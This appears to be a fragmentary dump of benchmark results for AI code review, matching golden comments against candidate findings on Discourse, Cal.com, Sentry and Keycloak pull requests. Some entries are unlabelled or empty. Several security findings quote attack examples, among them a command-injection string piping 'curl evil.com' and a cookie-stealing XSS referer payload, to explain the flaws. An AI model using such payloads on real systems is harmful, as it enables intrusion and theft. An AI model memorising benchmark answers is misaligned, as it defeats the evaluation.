The route provides the group's ID in params[:id], but the code attempts to read it from params[:group_id], causing the action to fail. This results in a broken feature when trying to access group memberships.

true_positives.golden_comment: BlockedEmail.should_block_email? method has side effects during a read operation - it updates statistics even when just checking if an email should be blocked. This could cause race conditions in concurrent environments and makes the method name misleading.
true_positives.matched_candidate:
Match statistics written from inside a validation get rolled back / double-counted

`BlockedEmail.should_block?` performs a DB write (increments `match_count`, sets `last_match_at`) and it is invoked from `validate_each`, i.e. from the record's validation chain. Two consequences: (1) ActiveRecord runs validations inside the save transaction, so when the user save ultimately fails (which is exactly what happens when the email is blocked) the counter update is rolled back and the match is never recorded for any code path that calls `user.save` directly (e.g. `User.create_for_email`, invite redemption); (2) `UsersController#create` calls `user.valid?` (for the Discourse Hub check) and then `user.save`, so the validator runs twice and a single signup attempt can increment `match_count` twice. Statistics should be updated outside validation (e.g. in the controller/creation flow) or with an atomic `update_column`/`increment!` executed outside the transaction.
true_positives.reasoning: Both identify the same underlying concern: the email-blocking predicate writes match statistics as a side effect of checking whether an email is blocked. The candidate emphasizes validation-related rollback and double-counting rather than race conditions or misleading naming, but points to the same problematic write during a read/check operation.

true_positives.golden_comment: The case-sensitive email lookup in `BlockedEmail.should_block?` creates a bypass risk, allowing 'User@Example.com' to bypass a block on 'user@example.com'. This can lead to unauthorized access to blocked users.
true_positives.matched_candidate:
Blocked-email lookup is exact and case-sensitive, trivially bypassed

`should_block?` does `BlockedEmail.where(email: email).first` with no normalization, and neither the model nor the migration downcases/strips the stored value. Since user-supplied emails are not normalized before reaching the validator, blocking `spammer@example.com` does not block `Spammer@Example.com` (Postgres string comparison is case-sensitive), so the block is defeated by changing capitalization. Normalize on write (`before_validation { self.email = Email.downcase(email).strip }`) and on lookup, and make the unique index operate on the normalized value.
true_positives.reasoning: Both identify the same case-sensitive email lookup in BlockedEmail.should_block?, allowing blocked users to bypass the block by changing email capitalization.

false_positives.candidate:
Non-atomic read-modify-write of match_count loses updates

`record.match_count += 1; record.save` reads the current value in Ruby and writes it back. Concurrent signup attempts with the same blocked email (the common case for a spam wave) will read the same value and overwrite each other, under-counting matches. Use an atomic SQL increment (e.g. `BlockedEmail.where(id: record.id).update_all('match_count = match_count + 1, last_match_at = ...')`) instead. Also note `record.save` here silently ignores failures (its return value is discarded), so a validation/DB error leaves the counter silently unupdated.

rejectedEmails array is defined on the prototype and shared/never reset

`rejectedEmails: Em.A([])` is a mutable array literal on the class definition, so it is shared by every instance of `CreateAccountController` and is never cleared. Because `pushObject` mutates this shared array, emails rejected during one modal session stay rejected for the lifetime of the page (and are visible to any other instance), e.g. after an admin unblocks an address or after the user fixes an unrelated server-side error, the email field keeps showing "invalid". Initialize it per instance (in `init`/`setupController`) and reset it when the modal is opened.

Blocked-email check is skipped when another email error exists

The `record.errors[attribute].blank?` guard means that if the whitelist/blacklist rule already added an error (or any earlier validator added an email error, e.g. uniqueness), `BlockedEmail.should_block?` is never called and the match is neither detected nor counted. The blocked-email statistics therefore silently miss attempts that also trip another email rule, which undermines the `match_count`/`last_match_at` data this feature is built on.

Extracted whitelist/blacklist logic is untested in the new validator spec

The whitelist/blacklist email-domain logic was moved out of `User#email_validator` into `EmailValidator`, but the new spec only exercises the blocked-email branch with `should_block?` stubbed. There is no coverage for `email_domains_whitelist`/`email_domains_blacklist` behaviour in its new location, nor an integration test proving that `validates :email, email: true, if: :email_changed?` on `User` actually rejects a blocked email on save. A regression in the moved code would go unnoticed.

false_negatives.golden_comment: The regex pattern @(#{domains}) in email_in_restriction_setting? method only matches domain suffixes, not full domains with proper boundary anchoring. An attacker can register evil.example.com to bypass a whitelist entry for example.com.

true_positives.golden_comment: -ms-align-items never existed in any version of IE/Edge; the correct legacy property is -ms-flex-align.
true_positives.matched_candidate:
align-items mixin emits legacy properties that reject modern values and omits -moz-box-align

`@mixin align-items($alignment)` forwards the standard value verbatim to `-webkit-box-align` and `-ms-flex-align`, but those legacy specs only accept `start|end|center|baseline|stretch`. Any future call such as `@include align-items(flex-start)` will emit invalid declarations for the old box model / IE10, silently falling back to the default alignment. It also emits `-ms-align-items`, which is not a real property, while omitting `-moz-box-align` even though `flexbox()` emits `display: -moz-box` for old Gecko — so in exactly the engine the prefix was added for, alignment is never applied. Either map the values (`flex-start` -> `start`, etc.) or drop the legacy prefixes.
true_positives.reasoning: The candidate explicitly identifies -ms-align-items as a nonexistent property and references -ms-flex-align as the legacy property, matching the golden issue despite raising additional concerns.

true_positives.golden_comment: -webkit-box-ordinal-group and -moz-box-ordinal-group require values starting from 1, not 0. If $val is 0, this will cause incorrect rendering in older browsers, leading to layout issues.
true_positives.matched_candidate:
order mixin does not translate to the 1-based legacy box-ordinal-group

`-webkit-box-ordinal-group` / `-moz-box-ordinal-group` are 1-based (minimum value 1, default 1), whereas standard `order` is 0-based (default 0). Passing the same number to both means `@include order(0)` produces an invalid ordinal group, and siblings without an explicit order default to group 1 in the legacy model but 0 in the standard one, so the relative ordering can differ between old prefixed engines and modern ones. The mixin should offset the legacy value (e.g. `$val + 1`) or omit the legacy box prefixes.
true_positives.reasoning: Both identify the same bug: legacy -webkit-box-ordinal-group and -moz-box-ordinal-group require values starting at 1, so passing $val = 0 causes invalid values and incorrect ordering or layout in older browsers.

`float: right` on button is ignored now that `.small-action` is a flex container

`.small-action` now sets `display: flex` (via `@include flexbox()` at line 264), which makes `float` a no-op on its children. The `button { float: right; }` rule inside `.small-action` therefore no longer pushes the action button to the right edge; it will be laid out inline right after `.small-action-desc`. The same applies to `.topic-avatar { float: left; }` (line 270), which is now dead. To keep the button right-aligned the desc should get `flex: 1` (or the button `margin-left: auto`) instead of relying on floats.

`.small-action-desc` padding changed from `0.5em 0 0.5em 4em` to `0 1.5%`. The old left padding of 4em reserved space for the floated 45px avatar; the new value is a percentage of the flex container's width, so on narrow containers the gap between avatar and text collapses to a couple of pixels, and on wide ones it grows arbitrarily. A fixed-length padding/margin (or `flex` sizing) would give stable spacing.

Auto margins are not honoured by the old `display: -webkit-box` / `-moz-box` model that `flexbox()` explicitly emits, so in those engines the panel (user menu, search, hamburger icons) will sit immediately after the title instead of at the right edge, with no float fallback remaining. Either drop the legacy `display` prefixes or keep a fallback alignment.

`.valign-helper` relies on `height: 100%` plus `vertical-align: middle` to vertically centre header content. Now that `.contents` is a flex container with `align-items: center`, `vertical-align` has no effect on its children and `height: 100%` resolves against an auto-height flex line, so this rule no longer does anything and should be removed to avoid confusion.

Further this PR removes the float-based right alignment for .d-header .panel, which may cause the login panel in the non-Ember/noscript header (where .panel is nested inside .row and not a flex item) to stack under the title instead of remaining right-aligned.

Rails serializers expect include_ methods to end with ? for conditional attribute inclusion, a convention followed by other methods in this serializer. Without it, the website_name attribute may not be conditionally included as intended. `include_website_name` is missing the trailing `?` so the conditional never applies

The method is defined as `include_website_name` (no question mark), so it is never invoked and `website_name` is unconditionally serialized. Consequences: the key is emitted (with a `null` value) even when the user has no website, and, more importantly, the intended "only when a website exists" gate is dead code. false_positives.candidate:
website_name bypasses the untrusted_attributes restriction and leaks TL0 websites to anonymous users

`website` is listed in `untrusted_attributes` (line 109), so for a TL0 user viewed by an anonymous visitor it is withheld (`scope.restrict_user_fields?`). The new `website_name` attribute derives directly from `object.user_profile.website` but has no such guard (and its `include_website_name` helper is misnamed, see other finding), so the host — and the full path when the domain matches the instance domain — is serialized to anonymous visitors for restricted users. This re-opens the spam/privacy hole that hiding `website` was meant to close. Add `website_name` to `untrusted_attributes` (or return nil when `scope.restrict_user_fields?(object)`).

untrusted attribute spec not updated for website_name

The "with a TL0 user seen as anonymous" context asserts that bio/location/website etc. are absent, but `website_name` was not added to `untrusted_attributes`. Because the new attribute is derived from the website and is currently serialized unconditionally, this spec passes while the website information still leaks. Add `website_name` to the list so the regression is caught.

`"." << website_host` mutates a string literal and will raise under frozen_string_literal

`discourse_host.ends_with?("." << website_host)` uses the destructive `<<` on a literal receiver. It works today only because the literal is re-allocated on each evaluation; if `# frozen_string_literal: true` is ever added to this file (common in this codebase) it raises `FrozenError` on every profile serialization. Use non-mutating concatenation, e.g. `".#{website_host}"`.

`URI(...).host` preserves the case the user typed, so a profile website of `http://EXAMPLE.com/user` will not match `Discourse.current_hostname` (`example.com`) and the full path will not be shown; comparisons should downcase both hosts. Additionally `website_host + URI(website.to_s).path` yields a trailing `example.com/` for root URLs and silently drops any query string, so the displayed text can differ from the actual link target.

`URI('example.com/user').host` is nil, so `website_name` returns nil and the template's `{{#if model.website_name}}` hides the link entirely. The previous client-side implementation (`website.split('/')[2]`) also mis-handled such values, but it at least produced a truthy string in some cases; now a stored scheme-less website makes the globe/link disappear from the profile. true_positives.golden_comment: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
true_positives.matched_candidate:
Kernel#open on a site-setting URL allows command execution and SSRF

`SimpleRSS.parse open(SiteSetting.feed_polling_url)` uses `Kernel#open`, which executes a shell command when the argument starts with `|` (e.g. `|curl evil.com`) and will happily fetch internal addresses (127.0.0.1, link-local metadata endpoints). true_positives.reasoning: The candidate identifies the same unvalidated feed_polling_url passed to open and the resulting SSRF risk of fetching arbitrary internal or external URLs. Its additional command-execution concern does not negate the match.

true_positives.golden_comment: The current origin validation using indexOf is insufficient and can be bypassed. An attacker could use a malicious domain like evil-discourseUrl.com to pass this check.
true_positives.matched_candidate:
postMessage origin check uses substring matching and can be bypassed

`if (discourseUrl.indexOf(e.origin) === -1) { return; }` accepts any origin that is a *substring* of the configured Discourse URL rather than comparing the actual origin. For example with `discourseUrl = 'http://evil.com.discourse.example.com/'` the origin `http://evil.com` passes the test, letting a third-party frame drive the resize handler. true_positives.reasoning: Both identify the same underlying vulnerability: origin validation using indexOf performs substring matching rather than exact origin comparison, allowing an attacker-controlled origin to pass. The differing examples do not change the core issue.

true_positives.golden_comment: The ERB block closes with end if, which is invalid Ruby/ERB and will raise at render; it should just be end to close the if block.
true_positives.matched_candidate:
`<%- end if %>` is a Ruby syntax error, breaking the main embed view

The header block is closed with `<%- end if %>`. The ERB compiler emits the literal Ruby `end if`, which closes the `if`/`else` and then starts a *new*, never-closed `if` statement (Ruby allows a newline between `if` and its condition, so the following buffer append becomes the condition). The template therefore raises a SyntaxError (`unexpected end-of-input`) whenever it is compiled, so `GET /embed/best` will 500 for every topic that already has an embed. It should simply be `<%- end %>`. Note the specs never render this template with posts present (TopicView is mocked), so the failure is not caught by tests.
true_positives.reasoning: Both identify `<%- end if %>` as invalid Ruby/ERB that causes a syntax error when rendering the template, and both specify replacing it with `<%- end %>`.

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated. However, many RSS feeds do not provide a `content` field, leading to a potential nil pointer exception when `i.content` is nil. A fallback to `description` should be implemented to prevent crashes.
true_positives.matched_candidate:
`i.content.scrub` breaks for RSS feeds and on Ruby < 2.1

The job claims to support "RSS or ATOM", but SimpleRSS only exposes `content` for Atom `<content>` / `content:encoded`; a plain RSS 2.0 item only has `description`. For such feeds `i.content` is nil and `nil.scrub` raises NoMethodError, and because the job sets `sidekiq_options retry: false` the import silently never happens. Additionally `String#scrub` only exists in Ruby >= 2.1, so on Ruby 2.0 (still supported per the Gemfile/platform notes) even Atom feeds raise NoMethodError. true_positives.golden_comment: An unescaped request header (request.referer) is interpolated into JavaScript without proper escaping, which can lead to XSS vulnerabilities if the referer contains malicious content. This issue can allow attackers to execute arbitrary scripts in the context of the application.
true_positives.matched_candidate:
Unescaped request.referer interpolated into inline JavaScript (XSS)

`parent.postMessage({...}, '<%= request.referer %>')` injects the raw Referer header into a single-quoted JS string literal with no escaping. Only the *host* part of the referer is validated in EmbedController#ensure_embeddable; the path and query are arbitrary, so a URL on the embeddable host such as `http://host/page?x='+alert(document.cookie)+'` (or one containing `</script>`) breaks out of the string and executes attacker-controlled script in the context of the Discourse origin, with the visitor's session. Escape it, e.g. `<%= j request.referer %>` / `json_escape`, and preferably send only the origin (scheme://host:port) rather than the full URL.

`cook` now returns `raw` verbatim when `cook_method == raw_html`, bypassing PrettyText/sanitization entirely. A hostile or compromised feed can therefore inject `<script>`, `onerror=`, iframes, etc. into forum pages for all users. The HTML needs to be run through a sanitizer (e.g. Sanitize with a whitelist, as ruby-readability does for the import_remote path) before being stored as cooked.

In the `else` branch, `post = embed.post` is passed straight to `PostRevisor.new(post)`. If the original post (or its topic) was deleted/trashed, `embed.post` is nil and `PostRevisor#revise!` immediately raises NoMethodError on `@post.raw`, so the poll_feed job (retry: false) or the embed retrieval job dies for that URL and the embed stays permanently broken. Guard for a missing post and either recreate the topic or skip the row.

The logic must be "available if the slot fits inside at least one working-hour range for that day" (e.g. `!workingHours.some(covers)`).

Wrapping the previous predicate in an `OR` with `retryCount > 1` means Postgres can no longer satisfy the delete with the `[method, scheduled, scheduledDate]` index alone and will likely sequentially scan `WorkflowReminder`, which is one of the largest tables, on every run of this cron. Credential-sync request is unauthenticated and its status is never checked

The newly added code calls `prisma.credential.update(...)` inside `getClient`, but this file has no `import prisma from "@calcom/prisma"`. `getClient` issues a refresh_token request to `login.salesforce.com` and a `credential.update` write every time a `SalesforceCalendarService` is constructed, with no expiry check on the stored token. `refreshOAuthTokens(..., "zoomvideo", credential.userId)` sends `appSlug=zoomvideo`, but the Zoom app's slug used everywhere else (callback stores `appId: "zoom"`, and the new `/api/webhook/app-credential` endpoint looks the app up with `prisma.app.findUnique({ where: { slug } })`) is `zoom`. A self-hoster keying off `appSlug` will not be able to map the sync request back to the credential the webhook created, so Zoom credential syncing silently fails.

Webex refresh still validated with the strict provider schema, so credential sync cannot work

Webex was switched to `refreshOAuthTokens` but the response is still validated with `webexRefreshedTokenSchema.safeParse(...)`, which requires an exact `scope` literal, `token_type: "Bearer"`, `refresh_token` and `refresh_token_expires_in`. A self-hosted sync endpoint is documented to return only the access token and expiry, so the parse always fails and `refreshAccessToken` rejects with "Invalid refreshed tokens were returned". Either use `parseRefreshTokenResponse` here (as done for zoom/office365) or don't wire Webex into the sync flow.

Updating synced credentials does not clear the `invalid` flag

When a credential already exists the handler only writes `key`. Credentials that were previously marked `invalid: true` (e.g. google/zoom/webex set this on `invalid_grant`) stay invalid after fresh keys are pushed in, so Cal.com keeps treating the connection as broken even though valid tokens were just synced. The update should also reset `invalid: false`.

The shared secret check uses a plain string inequality, which short-circuits on the first differing byte and is therefore vulnerable to timing analysis; use `crypto.timingSafeEqual` on equal-length buffers. Because the lookup is `findFirst({ where: { userId, appId } })`, when a user has more than one credential row for the same app (which happens for several apps that historically allowed duplicates) only one row is updated; the stale rows keep their old keys and may still be selected by other code paths (`findFirst` is used in several adapters). This PR adds a publicly reachable endpoint that decrypts a payload and writes third-party OAuth credentials for arbitrary user ids, plus two new shared helpers (`parseRefreshTokenResponse`, `refreshOAuthTokens`) used by ~10 app integrations, with no unit tests. true_positives.matched_candidate:
Unhealthy flusher process is never killed (isinstance check is always False for spawn processes)

`_ensure_processes_alive()` only kills the old process if `isinstance(process, multiprocessing.Process)`. The processes here are created with `multiprocessing.get_context("spawn").Process`, i.e. `multiprocessing.context.SpawnProcess`, which is **not** a subclass of `multiprocessing.Process` (`multiprocessing.context.Process`) — both derive separately from `BaseProcess`. So the check is always False and `process.kill()` never runs, whereas the previous code called `self.process.kill()` unconditionally. Consequences: a hung-but-alive flusher process is left running while a replacement is spawned for the same shards, so two processes flush the same Redis shards concurrently (duplicate segments produced to `buffered-segments`, racing `done_flush_segments`), and the zombie keeps writing to the shared `process_healthy_since` Value, permanently masking hang detection and leaking a process on every restart. The same wrong check also makes `process.terminate()` in `join()` (line 346) a no-op. Use `multiprocessing.process.BaseProcess` (or `self.mp_context.Process`) in the isinstance check.
true_positives.reasoning: Both identify that SpawnProcess is not a subclass of multiprocessing.Process, making the isinstance check always false and preventing hung flusher processes from being killed.

true_positives.golden_comment: Sleep in test_consumer.py won’t actually wait because time.sleep was monkeypatched above; consider restoring sleep or using a different sync to ensure the flusher has time to process.
true_positives.matched_candidate:
Added `time.sleep(0.1)` is a no-op because time.sleep is monkeypatched

Line 15 does `monkeypatch.setattr("time.sleep", lambda _: None)`, so the `time.sleep(0.1)` added at line 62 ("Give flusher threads time to process after drift change") returns immediately and provides no synchronization at all. The test still relies on the flusher thread happening to flush before `step.join()` sets the stop flag, so it remains racy/flaky and the comment is misleading. Use a real wait (e.g. `monkeypatch`-free sleep, or poll `messages` with a timeout) instead.
true_positives.reasoning: Both comments identify the same bug: the test's time.sleep call is ineffective because time.sleep was monkeypatched, so it provides no real synchronization and the test remains racy. The candidate's suggested fix aligns with the golden comment.

false_positives.candidate:
max_processes=None/0 silently means one process per shard

`self.max_processes = max_processes or len(buffer.assigned_shards)` means that any caller that does not pass `max_processes` (the default, used by every direct construction such as `tests/sentry/spans/consumers/process/test_flusher.py`) spawns one OS process per assigned shard, while the CLI option `--flusher-processes` defaults to 1. A consumer assigned 32 partitions constructed without the option would fork 32 flusher processes, each with its own Redis connections — a large, unintended resource jump compared to the previous single-process behaviour. Additionally, because of `or`, an explicit `--flusher-processes 0` is silently reinterpreted as "one per shard" instead of being rejected. Make the default explicit (e.g. 1) and validate that the value is >= 1.

join() can skip terminating remaining processes and computes an unused variable

In `join()`, `remaining_time` is computed but never used, and when the deadline has passed the loop `break`s, so the remaining processes in `self.processes` are never waited for nor terminated (they are only daemonic, so they are killed when the parent exits, possibly mid-flush). Combined with the broken `isinstance(process, multiprocessing.Process)` check on line 346, no spawn process is ever terminated at shutdown. Either drop the unused variable and terminate all processes regardless of deadline, or document why skipping is acceptable.

Dead method `_create_process_for_shard`

`_create_process_for_shard(shard)` is not called anywhere after the refactor (restarts go through `_create_process_for_shards(process_index, shards)`). Leaving it in is confusing because it looks like the per-shard restart path but would silently do nothing if `shard` is not in any mapping. Remove it.

Comma-joined shard list used as metric tag value creates unbounded cardinality

`shard_tag = ",".join(map(str, shards))` is used as the `shard` tag on `spans.buffer.flusher.produce` and the per-segment `spans.buffer.segment_size_bytes` timing. The value is a *set* of shards that changes with every Kafka rebalance and with the `--flusher-processes` setting, so the tag value space is combinatorial rather than bounded by the number of shards, and `segment_size_bytes` is emitted per segment. This can blow up metric cardinality and makes per-shard aggregation impossible. Consider tagging with the process index or omitting the tag on high-volume metrics.

Class docstring contradicts actual process allocation and omits max_processes

The docstring says "Creates one process per shard for parallel processing", but shards are actually bucketed round-robin into `min(max_processes, len(assigned_shards))` processes, and the CLI default is a single process for all shards. The docstring also still documents a `:param topic:` that does not exist while the newly added `max_processes` parameter is undocumented.

Shard-distribution assertion cannot detect duplicated or missing shards

`total_shards = sum(len(shards) for shards in flusher.process_to_shards_map.values()); assert total_shards == 4` would also pass if the same shard were assigned to two processes while another shard was dropped entirely — exactly the kind of bug that would cause duplicate or lost segments. Assert on the union instead, e.g. that the concatenation of all lists equals `{0,1,2,3}` with no duplicates, and that the buckets are balanced.

No test exercises the multiprocess flusher path

Both new/updated tests pass `produce_to_pipe`, which makes `SpanFlusher` use `threading.Thread` instead of `mp_context.Process`. The core change of this PR — spawning a real process per shard group, pickling a per-shard `SpansBuffer` into it, restarting a dead/hung process, and the `isinstance(process, multiprocessing.Process)` kill/terminate paths — is therefore completely untested (and indeed broken, see the isinstance finding). Add at least one test that drives the actual spawn-process path, or a unit test of `_ensure_processes_alive` with a fake spawn process.

false_negatives.golden_comment: Breaking out of the loop when the deadline has elapsed can skip terminating remaining flusher processes, potentially leaving them running after shutdown; consider ensuring termination is attempted even if the deadline is exceeded.

true_positives.matched_candidate:

true_positives.reasoning: Both identify the same bug: zip(error_ids, events.values()) assumes get_multi preserves input order and includes every ID, so missing or reordered entries can attach event data to the wrong error ID.

true_positives.matched_candidate:

false_positives.candidate:
Error and replay-event timestamps are compared in different units

`gen_request_data` interleaves error messages with replay breadcrumbs by comparing `error_events[error_idx]["timestamp"]` against `event.get("timestamp", 0)`. The error timestamp comes from the nodestore event payload and is epoch **seconds** (~1.7e9), while rrweb replay events carry epoch **milliseconds** (~1.75e12). Every error therefore compares as smaller than every replay event, so in production all errors will be flushed to the front of the log list instead of being placed chronologically, which is the whole point of the merge. The new unit test (`test_get_request_data`) uses second-scale timestamps for the replay events too, so it cannot catch this; a test with realistic millisecond rrweb timestamps is needed.

`Boolean(normalizedDateRange)` is always true, so the guard is dead

`normalizeDateTimeParams(selection.datetime)` always returns an object (possibly empty), so `Boolean(normalizedDateRange)` can never be false and the `enabled` condition reduces to the feature check alone. If the intent was to avoid firing the request before page filters are ready (e.g. checking for a statsPeriod/start+end), the condition needs to inspect the actual fields; as written it provides no protection and will issue a request with no date range.

60s processing deadline may be too short for a 100-identity batch and breaks the task chain

`check_auth_identities` iterates up to `chunk_size` (default 100) identities and calls `provider.refresh_identity()` for each, which performs an external HTTP round trip per identity. With `processing_deadline_duration=60` the worker will kill the task once the deadline passes; because `check_auth.apply_async(...)` is only executed at the very end of the function, a deadline kill also drops the self-rescheduling call, halting the chained scan of remaining identities until the next scheduled run. Either reduce the chunk size or set a deadline that bounds 100 sequential network calls.

get_environment_info issues an extra event lookup per issue and swallows errors as 'no-environment'

`get_environment_info` calls `issue.get_recommended_event()` (a Snuba/eventstore lookup) plus `get_environment()` for every issue included in a merged-PR comment, i.e. up to 5 extra queries per comment on top of the existing top-issues query. In addition, the blanket `except Exception` logs `get_environment_info.no-environment` with `extra={"error": e}`, which both mislabels real failures (timeouts, Snuba errors) as 'no environment' and loses the traceback (no `exc_info`/`logger.exception`), making such failures effectively invisible.

Serializer accepts reports with neither `timestamp` nor `age`

`age` and `timestamp` are both declared `required=False` and the `validate_age`/`validate_timestamp` hooks only reject the case where *both* are present. A report containing neither field passes validation even though both the Working Draft and Editor's Draft require one of them, so malformed payloads are silently accepted and counted. A `validate()` method asserting exactly one of the two is present would close the gap (and there is no test covering this case).

TabularColumn.name is typed as the field-key generic instead of string

`TabularColumn<TFields>` declares `name: TFields`, the same type as `key`. `name` is a human-readable display label (the new table explicitly supports custom names such as 'Count of Span Duration'), so once a caller instantiates `TabularColumn<'http.request_method' | 'count(span.duration)'>` the display name becomes impossible to set without a cast. `name` should be `string`.

In BaseDetectorTypeValidator.update(), the validator incorrectly updates instance.type using validated_data.get('detector_type') instead of validated_data.get('type').

Validation logic incorrectly uses .get('timestamp'), which treats a timestamp of 0 as absent. It should directly check 'timestamp' in self.initial_data to ensure proper field presence detection, preventing both 'age=0' and 'timestamp' from passing mutual-exclusion validation.

true_positives.golden_comment: In GroupPermissionsV2.canManage(), the permission fallback checks for both VIEW and MANAGE scopes (hasPermission(null, AdminPermissionsSchema.VIEW, AdminPermissionsSchema.MANAGE)), but canManage() should only grant access for MANAGE scope, not VIEW. This means users with only VIEW permission on groups can pass the canManage() check, granting them write access they should not have. The canView() method correctly checks both VIEW and MANAGE, but canManage() should only check MANAGE.
true_positives.matched_candidate:
canManage() grants management rights to admins that only have the view scope

`GroupPermissionsV2.canManage()` (the no-argument variant) returns `true` when the caller has either `AdminPermissionsSchema.VIEW` or `AdminPermissionsSchema.MANAGE` on the `Groups` resource type. `canManage()` is used by `GroupsResource.addTopLevelGroup` via `auth.groups().requireManage()`, so an administrator who was only granted the `view` scope on all groups can create top-level groups. This is a privilege escalation: the `view` scope must not satisfy a manage check. Only `MANAGE` should be accepted here (as in `canManage(GroupModel)`). Note that the new test `testViewGroups` only grants `VIEW` and never asserts that write operations stay forbidden, so this escalation is untested.
true_positives.reasoning: Both identify the same bug in GroupPermissionsV2.canManage(): the no-argument variant treats VIEW as sufficient for management, allowing view-only admins to perform write operations. The candidate correctly states only MANAGE should pass, matching the golden comment.

true_positives.golden_comment: In getGroupIdsWithViewPermission, hasPermission is called with groupResource.getId() and the same groupResource.getId() is added to granted, but hasPermission resolves resources by name (treating the argument as a group id) and the GroupPermissionEvaluator contract says this method returns group IDs that are later used as UserModel.GROUPS and in getUsersCount group filters. This mismatch means per-group VIEW_MEMBERS/MANAGE_MEMBERS permissions may not yield the expected group IDs for filtering and counts, and evaluation may effectively only look at the type-level 'all-groups' resource; consider revisiting whether this should operate on the underlying group ids (resource names) instead so it aligns with the JPA queries and the interface contract.
true_positives.matched_candidate:
getGroupIdsWithViewPermission returns authz resource IDs, not group IDs

In `getGroupIdsWithViewPermission()` the code iterates authz resources of type `Groups` and (a) calls `hasPermission(groupResource.getId(), ...)` and (b) adds `groupResource.getId()` to the returned set. For group resources created by `AdminPermissionsSchema.getOrCreateResource`, the *resource name* is the group ID; the resource ID is an unrelated UUID. Consequently:

1. `hasPermission(resource.getId(), ...)` does `resourceStore.findByName(server, <resource UUID>)`, which never matches, so evaluation silently falls back to the "all groups" resource instead of evaluating the individual group.
2. The returned set contains resource UUIDs, while the only consumers (`UsersResource.searchForUser`/`getUsersCount` and `BruteForceUsersResource.searchForUser`, which put the set in `session.setAttribute(UserModel.GROUPS, ...)` and pass it to `UserProvider.getUsersCount(realm, ..., groupIds)`) expect group IDs.

Result: when an admin's only access to users comes from group `view-members`/`manage-members` permissions, the user search/count is filtered by non-existent group IDs and returns nothing (or, when the set is empty, the DB query is not restricted at all and the admin may see an empty page because filtering happens after pagination). The V1 implementation correctly derived the group ID from the resource name (`resource.getName().substring(RESOURCE_NAME_PREFIX.length())`). The set should contain `groupResource.getName()` and the permission check should be done with the resource name/group ID.
true_positives.reasoning: Both comments describe the same bug: group permission evaluation and returned IDs use authz resource UUIDs instead of resource names, which are the actual group IDs expected by permission checks and user filtering/count queries.

false_positives.candidate:
NullPointerException when the "Groups" resource-type resource does not exist

In `hasPermission(String groupId, String... scopes)`, when no resource is found for the group the code falls back to `AdminPermissionsSchema.SCHEMA.getResourceTypeResource(session, server, GROUPS_RESOURCE_TYPE)` and then immediately dereferences the result (`policyStore.findByResource(server, resource)` and `resource.getScopes()`), without a null check. `getResourceTypeResource` returns `null` whenever `supportsAuthorizationSchema` is false (e.g. the realm has an admin-permissions client but `adminPermissionsEnabled` is false) or when the resource named `Groups` simply does not exist. The latter is reachable in practice: `AdminPermissionsSchema.init()` returns early if the admin permissions client already exists, so realms that enabled FGAP v2 before the `Groups` resource type was added never get the `Groups` resource or the new `manage-membership`/`manage-members`/`view-members` scopes. Any group permission check in such a realm then fails with a NPE (HTTP 500) instead of a clean deny. Add a null guard (and consider a migration/upgrade path for already-initialized admin permission clients).

Scope loop does not verify that the granted permission belongs to the evaluated resource

The result loop in `GroupPermissionsV2.hasPermission` accepts any returned `Permission` whose scope list intersects the expected scopes, without checking `permission.getResourceId().equals(resource.getId())`. The analogous `UserPermissionsV2.hasPermission` (same file layout, line ~123) explicitly performs that check, which indicates the evaluation result can contain permissions for resources other than the one being evaluated (e.g. resource-type level resources). Without the check, access to one group resource can be granted by a permission evaluated for a different resource. Please align the two implementations.

V1 group permission management breaks when both FGAP v1 and v2 features are enabled

`MgmtPermissionsV2` now overrides `groups()` to return `GroupPermissionsV2`, whose `isPermissionsEnabled`, `setPermissionsEnabled`, `resource`, `getPermissions` and `*Permission` methods all throw `UnsupportedOperationException`. `AdminPermissions.management(session, realm)` returns `MgmtPermissionsV2` as soon as `ADMIN_FINE_GRAINED_AUTHZ_V2` is enabled, independently of `ADMIN_FINE_GRAINED_AUTHZ`. Therefore, with both preview features enabled:

- `AdminPermissions.registerListener` (registered because v1 is enabled) handles `GroupModel.GroupRemovedEvent` by calling `management(...).groups().setPermissionsEnabled(group, false)` → `UnsupportedOperationException`, so deleting any group fails with an internal server error.
- `GroupResource.getManagementPermissions()` / `setManagementPermissionsEnabled()` (guarded only by the v1 feature flag) call `permissions.groups().isPermissionsEnabled(...)` / `setPermissionsEnabled(...)` → HTTP 500 instead of the previous behaviour.

Before this change `MgmtPermissionsV2` inherited the working V1 `GroupPermissions` for these management operations. Either keep returning the V1 management implementation for these paths or make the listener/endpoints v2-aware.

getResourceName has no branch for the new Groups resource type

`getResourceName` resolves human-readable names only for the `Users` resource type (`All users` or the username) and otherwise falls back to `resource.getDisplayName()`. Group resources are created in `getOrCreateResource` with only a name (the group ID) and no display name, so permissions scoped to a single group will be reported with a `null` name in the policy/permission representation shown in the admin console. A `Groups` branch is needed that returns `All groups` for the resource-type resource and the group name/path for an individual group (and that handles a stale resource whose group no longer exists).

switch on resourceType throws NullPointerException for a null resource type

`getOrCreateResource` now does `switch (resourceType) { case CLIENTS_RESOURCE_TYPE -> ... default -> throw new IllegalStateException(...) }`. A Java `switch` over a `String` throws `NullPointerException` when the selector is null, so callers that pass a null resource type now get an unhandled NPE (HTTP 500) instead of the previous `IllegalStateException("Could not map resource object ...")`/validation error. Add an explicit null check before the switch so the failure surfaces as a validation error.

Javadoc of requireManageMembers and getGroupIdsWithViewPermission is wrong

The Javadoc added for `requireManageMembers(GroupModel)` says it throws `ForbiddenException` if `canManageMembership(GroupModel)` returns false, but the implementation checks `canManageMembers(GroupModel)` — the copy/pasted reference documents the wrong contract. Likewise, the Javadoc of `getGroupIdsWithViewPermission()` (line 145) says "@return Stream of IDs of groups" while the method returns a `Set<String>`. Both should be corrected since this interface is the contract documentation for the new FGAP evaluators.

Removal of the global view short-circuit causes a policy evaluation per group

`getGroups` previously computed `boolean canViewGlobal = groupsEvaluator.canView()` once and only fell back to the per-group check when the global check failed; the same pattern was removed from `GroupResource.getSubGroups`. Now `canView(g)` is invoked for every group in the result. With FGAP v2 that means, for an admin without the `view-users`/`manage-users` roles, one `resourceStore.findByName` lookup plus a full authorization policy evaluation per returned group even when a single "all groups" view permission already grants access. For realms with large group lists this multiplies the cost of the group listing endpoints; consider restoring a cheap global short-circuit.

false_positives.candidate:
Java ChoiceFormat / single-brace placeholders break i18next message in account UI

